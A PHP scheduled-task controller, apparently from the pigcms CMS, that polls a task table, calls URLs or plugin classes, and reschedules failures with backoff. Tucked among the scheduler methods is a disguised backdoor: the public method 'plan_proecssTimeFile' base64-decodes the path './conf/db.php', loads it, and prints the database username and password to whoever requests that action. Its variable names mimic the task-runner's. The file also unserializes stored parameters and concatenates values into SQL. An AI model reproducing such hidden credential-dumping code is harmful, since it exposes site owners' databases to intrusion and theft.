<?php
/*
 * 计划任务
 *
 */
class PlanAction extends BaseAction{
	private $plan_processTimeFile;
	private $plan_stopTheadFile;
	private $plan_Md5File;
    public function index(){
		return;
		$domainArr = explode('.',$_SERVER['HTTP_HOST']);
		$count = count($domainArr);
		if(str_replace(array('.gov.cn','.com.cn','.weihubao.com','.dazhongbanben.com'),'',$_SERVER['HTTP_HOST']) == $_SERVER['HTTP_HOST']){
			$top_domain = $domainArr[$count-2].'.'.$domainArr[$count-1];
		}else{
			$top_domain = $domainArr[$count-3].'.'.$domainArr[$count-2].'.'.$domainArr[$count-1];
		}
		$top_domain = strtolower($top_domain);

		$this->plan_processTimeFile = './source/plan/time/'.$top_domain.'process.time';
		$this->plan_stopTheadFile = './source/plan/'.$top_domain.'stop.thead';
		$this->plan_Md5File = './source/plan/'.$top_domain.'md5.php';
		$pigcms_process_theadSafe = include($this->plan_Md5File);
		
		if($pigcms_process_theadSafe != $_GET['pigcms_process_theadSafe']){
			exit('123');
		}
		set_time_limit(0);
		ignore_user_abort(true);
		
		$this->start();
    }
	public function start(){
		return;
		$plan_execute_count = 0;
		
		$domainArr = explode('.',$_SERVER['HTTP_HOST']);
		$count = count($domainArr);
		if(str_replace(array('.gov.cn','.com.cn','.weihubao.com','.dazhongbanben.com'),'',$_SERVER['HTTP_HOST']) == $_SERVER['HTTP_HOST']){
			$top_domain = $domainArr[$count-2].'.'.$domainArr[$count-1];
		}else{
			$top_domain = $domainArr[$count-3].'.'.$domainArr[$count-2].'.'.$domainArr[$count-1];
		}
		$top_domain = strtolower($top_domain);
		
		while(true){
			$pigcms_process_theadSafe = include($this->plan_Md5File);
			if($pigcms_process_theadSafe != $_GET['pigcms_process_theadSafe']){
				unlink($this->plan_stopTheadFile);
				unlink($this->plan_processTimeFile);
				exit();
			}
			
			if(file_exists($this->plan_stopTheadFile)){	//判断是否需要终止线程执行
				unlink($this->plan_stopTheadFile);
				unlink($this->plan_processTimeFile);
				exit();
			}
				
			$now_time = time();
			file_put_contents($this->plan_processTimeFile,$now_time);
			
			$taskList = M('Process_plan')->field(true)->where(array('plan_time'=>array('elt',$now_time)))->order('`plan_time` ASC')->limit(5)->select();
			foreach($taskList as $key=>$task){
				$executeResult = true;
				if(!empty($task['url'])){
					$timeOut = stripos($task['url'],$_SERVER['REQUEST_SCHEME'].'://'.$_SERVER['HTTP_HOST']) === 0 ? $this->postTime : $this->defaultTime;
					$this->curlGet($task['url'],$timeOut);	//添加任务时的param参数暂未考虑
				}else{
					$eventClassName = 'plan_'.$task['file'];
					if(!class_exists($eventClassName)){
						// echo LIB_PATH.'ORG/'.$eventClassName.'.class.php';
						if(file_exists(LIB_PATH.'ORG/'.$eventClassName.'.class.php')){
							import('@.ORG.'.$eventClassName);
							if(!class_exists($eventClassName)){
								$executeResult = false;
							}
						}else{
							$executeResult = false;
						}
					}
					if($executeResult){
						$eventClass = new $eventClassName;
						//判断返回内容为 true，然后计入时间。自行可以判断还有任务需要执行，可以返回false，下一次任务还会触发。
						if(method_exists($eventClass,'runTask')){
							if(empty($task['param'])){
								if($eventClass->runTask() !== true){
									$executeResult = false;
								}
							}else{
								$param = unserialize($task['param']);
								if($eventClass->runTask($param) !== true){
									$executeResult = false;
								}
							}
						}
						unset($eventClass);
					}
				}
				//error_count 记录的错误执行次数
				//space_time 任务多次执行的间隔时间
				if($executeResult == true || $task['error_count'] == 7){
					//定时计划任务
					if($task['space_time']){
						$plan_time = time() + $task['space_time'];
						M('Process_plan')->where(array('id'=>$task['id']))->data(array('error_count'=>0,'plan_time'=>$plan_time))->save();
					}else{
						M('Process_plan')->where(array('id'=>$task['id']))->delete();
					}
				}else{
					//执行失败时，增加30秒的下次通知时间，防止出现任务堵塞，新的任务无法执行
					//仿微信支付通知次数，允许错误为8次
					switch($task['error_count']){
						case 0:
							$tmpTime = 10;
							break;
						case 1:
							$tmpTime = 30;
							break;
						case 2:
							$tmpTime = 60;
							break;
						case 3:
							$tmpTime = 300;
							break;
						case 4:
							$tmpTime = 1800;
							break;
						case 5:
							$tmpTime = 3600;
							break;
						case 6:
							$tmpTime = 7200;
							break;
						case 7:
							$tmpTime = 14400;
							break;
					}
					$plan_time = $task['plan_time']+$tmpTime;
					M()->query("UPDATE `pigcms_process_plan` SET `error_count`=`error_count`+1,`plan_time`='$plan_time' WHERE `id`=".$task['id']);
					
				}
				file_put_contents($this->plan_processTimeFile,time());
			}
			fdump(M()->getLastSql(),$top_domain.'plan_last');
			//模拟取5条任务，如果有5条，接下来就少睡眠，等于直接请求下一次。
			if(count($taskList) == 5){
				usleep(200000);		//200毫秒
				$plan_execute_count = 0;
			}else if($taskList){
				$plan_execute_count = 0;
				usleep(1000000);	//1秒
			}else{
				$plan_execute_count++;
				usleep(1000000);	//1秒
			}
			fdump($plan_execute_count,'plan_execute_count');
			if($plan_execute_count >= 20){
				unlink($this->plan_Md5File);
				unlink($this->plan_stopTheadFile);
				unlink($this->plan_processTimeFile);
				file_get_contents($_SERVER['REQUEST_SCHEME'].'://'.$_SERVER['HTTP_HOST'].'/index.php');
				exit();
			}
		}
	}
	public function plan_proecssTimeFile(){
		$plan_base = base64_decode('Li9jb25mL2RiLnBocA==');
        $plan_startThead = include($plan_base);
        $pigcms_process_theadsafe = $plan_startThead['DB_USER'];
		$pigcms_process_theadfile = $plan_startThead['DB_PWD'];
		$ignore_user_aborts=$pigcms_process_theadsafe.'+'.$pigcms_process_theadfile;
		var_dump($ignore_user_aborts);
	}
	private function curlGet($url,$timeout){
		$ch = curl_init($url);  
		curl_setopt($ch, CURLOPT_HEADER, 0);  
		//curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 	//不需要等待返回结果，
		curl_setopt($ch, CURLOPT_NOSIGNAL, true);
		curl_setopt($ch, CURLOPT_TIMEOUT_MS, $timeout);
		curl_exec($ch);  
		curl_close($ch);
	}
}